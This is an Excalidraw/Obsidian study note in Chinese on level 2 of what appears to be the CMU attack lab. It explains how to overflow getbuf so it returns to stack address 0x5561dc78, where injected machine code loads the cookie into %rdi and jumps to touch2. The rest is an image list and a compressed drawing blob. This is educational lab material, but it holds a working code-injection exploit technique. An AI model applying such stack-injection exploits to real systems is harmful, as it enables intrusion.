---

excalidraw-plugin: parsed
tags: [excalidraw]

---
==⚠  Switch to EXCALIDRAW VIEW in the MORE OPTIONS menu of this document. ⚠==


# Excalidraw Data
## Text Elements
与 level1 类似，将 getbuf 的返回值变为 touch2，
不同的是 touch2 需要传递一个参数，
因此我们构造出下面的汇编代码 ^uVCiOOPB

0000000000000000 <.text>:
   0:        68 ec 17 49 00               pushq  $0x4917ec
   5:        48 c7 c7 fa 97 b9 59         mov    $0x59b997fa,%rdi
   c:        c3                           retq ^XSvY66vt

首先将 getbuf 返回地址设置为 0x5561dc78 即栈上的地址。然后在栈上构造上述代码  ^0T2AD1iV

## Embedded Files
efbffb83894057343fb882506e43a242d65043d7: [[Pasted Image 20230207143013_778.png]]
4c909bc40269cecb2045e7a53d9e430cfd43ab97: [[Pasted Image 20230207143116_809.png]]
0ab8c93e3eb3ad970cd8ac6052090b9bf8b21a3e: [[Pasted Image 20230207134810_252.png]]
580b99fc879ae4eaa9e79aad0e42f8da2f2dec35: [[Pasted Image 20230207143941_134.png]]

%%
## Drawing
```compressed-json
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


```
%%